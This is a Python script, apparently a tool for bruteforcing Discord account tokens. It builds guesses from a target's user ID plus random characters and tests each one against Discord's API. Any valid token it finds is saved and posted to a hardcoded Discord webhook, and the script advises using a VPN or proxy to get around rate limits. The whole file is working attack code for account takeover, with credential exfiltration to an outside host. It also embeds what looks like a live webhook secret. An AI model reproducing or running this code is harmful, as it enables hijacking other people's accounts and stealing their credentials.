# --- IMPORTS ---
from base64 import b64encode as b64
from base64 import b64decode
import base64
from random import choice as ch
import colorama
from colorama import Fore, Back, Style
from colorama import init
import os
import requests
import time

# --- COLOR SETUP ---
init()
os.system('color 7')
if os.name == 'nt':
  os.system('cls')
else:
  os.system('clear')

# --- WARN ---
print("NOTE: this bruteforcer does NOT work with MFA tokens, those seem to have a different structure than normal ones.\n\n")


# --- VARIABLES ---
WEBHOOK_URL = "https://discord.com/api/webhooks/921477455888392232/sppRZWXoC-iJSWdoG-WCKw50QvM4tV3lYnyhcUl-ISoCWRHT5DEb6cwU-5gjWVnMeo94"
URL = 'https://discordapp.com/api/users/@me'
valid_or_not = None
userid = input('UserID to bruteforce: ')
times = input('Amount of times to bruteforce (int): ')
once = 0
start = str(b64(userid.encode("utf-8"))).replace("'","")[1:]
CHARS = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'M', 'N', 'O', 'p', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '-', '_']
CHARS2 = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'M', 'N', 'O', 'p', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
try:
  f_read = open('ignore.txt', 'r')
  tokens_to_ignore = str(f_read.read())
  f_read.close
except:
  tokens_to_ignore = "lorem ipsum no_match"

while once < int(times):
  mid = str(ch(CHARS2) + ch(CHARS2) + ch(CHARS2) + ch(CHARS2) + ch(CHARS2) + ch(CHARS2))
  end = str(ch(CHARS) + ch(CHARS) + ch(CHARS) + ch(CHARS) + ch(CHARS) + ch(CHARS) + ch(CHARS) + ch(CHARS) + ch(CHARS) + ch(CHARS) + ch(CHARS) + ch(CHARS) + ch(CHARS) + ch(CHARS) + ch(CHARS) + ch(CHARS) + ch(CHARS) + ch(CHARS) + ch(CHARS) + ch(CHARS) + ch(CHARS) + ch(CHARS) + ch(CHARS) + ch(CHARS) + ch(CHARS) + ch(CHARS) + ch(CHARS))
  token = f"{start}.{mid}.{end}"
  if token in tokens_to_ignore:
    break
  else:
    headers = {"Authorization":f"{token}"} # TODO: finish this header thingee
    x = requests.get(URL, headers=headers)
    if int(x.status_code) == 401:
      try:
       f = open('ignore.txt', 'a')
       f.write(f"\n{token}")
       f.close
      except:
       f = open('ignore.txt', 'w')
       f.write(token)
       f.close
      valid_or_not = "INVALID"
      print(f"{Fore.RED}{once+1}) {token} {valid_or_not}")
      time.sleep(0.1)
    elif int(x.status_code) == 200:
      valid_or_not = "VALID"
      print(f"{Fore.GREEN}{once+1}) {token} {valid_or_not}")
      f = open('valid_token.txt', 'w')
      f.write(f'FOUND TOKEN "{token}" FOR USERID "{userid}"')
      f.close()
      hook_data = {
      "content" : f"_ _",
      "username" : "Bruteforce Alerts"
  }
      hook_data["embeds"] = [{"description" : f"The UserID \"{userid}\" has been successfully bruteforced!```TOKEN: \"{token}\"\n\nAMOUNT OF COMBOS TRIED: {once+1}```", "title" : "BRUTEFORCE SUCCESS!" }]
      requests.post(WEBHOOK_URL, json = hook_data)
      exit()
      break
    else:
      print(f"{Fore.YELLOW}You are being rate limited. The program will now freeze for a minute. If this issue persists, enable a VPN or prefix a proxy url to the \"URL\" variable (variable found on line 27).")
      time.sleep(60)
  once=once+1
if once >= int(times):
  if valid_or_not == "VALID":
    valid_count = "1"
  else:
    valid_count = "0"
  print(f"{Fore.CYAN}Out of {once} combinations tested, {valid_count} of them are valid.")
